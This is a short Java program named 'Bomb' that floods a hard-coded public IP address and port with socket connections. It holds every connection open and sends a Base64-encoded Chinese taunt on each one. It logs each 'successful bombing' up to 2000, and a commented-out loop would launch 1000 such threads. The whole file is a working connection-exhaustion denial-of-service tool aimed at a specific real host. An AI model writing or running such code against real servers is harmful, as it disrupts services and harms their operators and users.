import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class Bomb extends Thread {
	String host = "123.206.45.47";
	//String host="127.0.0.1";
	int port = 5858;
	ArrayList<Client> clientList = new ArrayList<Client>();

	static int index = 0;
	static int errindex = 0;

	class Client {
		Socket mSocket;

		Client(String host, int port) throws UnknownHostException, IOException {
			mSocket = new Socket(host, port);
		}
	}

	@Override
	public void run() {
		while (true) {
			try {
				Client client = new Client(host, port);
				Socket mSocket = client.mSocket;
				clientList.add(client);
	            String inputWord = "钱总来也！";
	            PrintWriter pw = new PrintWriter(mSocket.getOutputStream(), true);
                pw.println(Base64.encode(inputWord.getBytes("utf-8")));
				System.out.println("成功轰炸" + (++index) + "次");
				if(index>2000)
					return;
			} catch (Exception e) {
				System.err.println("失败轰炸" + (++errindex) + "次");
			}
		}
	}

	public static void main(String[] args) 
	{
		//for(int i=0;i<1000;i++)
			new Bomb().start();
	}
}
